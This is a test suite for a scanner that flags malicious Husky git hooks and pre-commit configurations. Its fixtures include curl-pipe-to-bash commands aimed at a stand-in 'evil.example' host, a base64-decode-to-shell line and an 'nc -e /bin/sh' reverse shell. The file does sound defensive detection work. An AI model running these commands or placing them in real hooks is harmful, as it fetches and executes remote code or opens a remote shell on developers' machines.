import { expect } from 'chai';
import { scanHuskyHook, scanPreCommitConfig } from '../detection/repo-hook-rules';
import { WorkspaceRuleType } from '../detection/workspace-rule-types';
import { SeverityLevel } from '../lib/events/sec-events';

suite('Roadmap Stage 2C: Repo Hook & Pre-Commit Rules', () => {
  suite('scanHuskyHook', () => {
    test('detects curl | bash and base64 -d in non-comment lines', () => {
      const hook = [
        '#!/usr/bin/env sh',
        '# curl https://example.com/ignored.sh | bash',
        'npm test',
        'curl -fsSL https://evil.example/payload.sh | bash',
        'echo aWQ= | base64 -d | sh',
      ].join('\n');

      const findings = scanHuskyHook(hook, '.husky/pre-commit');
      expect(findings).to.have.lengthOf(2);
      expect(findings[0].ruleId).to.equal('husky_suspicious_hook');
      expect(findings[0].type).to.equal(WorkspaceRuleType.GIT_CONFIG);
      expect(findings[0].severity).to.equal(SeverityLevel.HIGH);
      expect(findings[0].finding).to.include('Line 4:');
      expect(findings[1].finding).to.include('Line 5:');
    });

    test('detects TASK_RULES patterns such as nc -e', () => {
      const hook = ['#!/bin/sh', 'nc -e /bin/sh 10.0.0.1 4444'].join('\n');
      const findings = scanHuskyHook(hook, '.husky/post-merge');
      expect(findings).to.have.lengthOf(1);
      expect(findings[0].ruleId).to.equal('husky_suspicious_hook');
    });

    test('ignores clean husky hooks and comment lines', () => {
      const hook = ['#!/usr/bin/env sh', '# nc -e /bin/sh', 'npx lint-staged', 'npm run typecheck'].join('\n');
      const findings = scanHuskyHook(hook, '.husky/pre-commit');
      expect(findings).to.deep.equal([]);
    });
  });

  suite('scanPreCommitConfig', () => {
    test('detects suspicious local hook entry', () => {
      const yaml = [
        'repos:',
        '  - repo: local',
        '    hooks:',
        '      - id: evil-local',
        '        name: Evil Local',
        '        entry: bash -c "curl -s https://evil.example/x | sh"',
        '        language: system',
      ].join('\n');

      const findings = scanPreCommitConfig(yaml, '.pre-commit-config.yaml');
      expect(findings).to.have.lengthOf(1);
      expect(findings[0].ruleId).to.equal('pre_commit_suspicious_local_entry');
      expect(findings[0].type).to.equal(WorkspaceRuleType.GIT_CONFIG);
      expect(findings[0].severity).to.equal(SeverityLevel.HIGH);
    });

    test('detects mutable external rev and untrusted repo URL', () => {
      const yaml = [
        'repos:',
        '  - repo: https://github.com/pre-commit/pre-commit-hooks',
        '    rev: main',
        '    hooks:',
        '      - id: trailing-whitespace',
        '  - repo: http://192.168.1.50/evil/hooks',
        '    rev: v1.0.0',
        '    hooks:',
        '      - id: custom-hook',
      ].join('\n');

      const findings = scanPreCommitConfig(yaml, '.pre-commit-config.yaml');
      expect(findings).to.have.lengthOf(2);
      expect(findings[0].ruleId).to.equal('pre_commit_unpinned_rev');
      expect(findings[0].severity).to.equal(SeverityLevel.MEDIUM);
      expect(findings[1].ruleId).to.equal('pre_commit_untrusted_repo_url');
      expect(findings[1].severity).to.equal(SeverityLevel.HIGH);
    });

    test('allows clean pinned external and safe local configs', () => {
      const yaml = [
        'repos:',
        '  - repo: https://github.com/pre-commit/pre-commit-hooks',
        '    rev: v4.6.0',
        '    hooks:',
        '      - id: end-of-file-fixer',
        '  - repo: local',
        '    hooks:',
        '      - id: eslint',
        '        name: ESLint',
        '        entry: npx eslint',
        '        language: system',
      ].join('\n');

      const findings = scanPreCommitConfig(yaml, '.pre-commit-config.yaml');
      expect(findings).to.deep.equal([]);
    });
  });
});
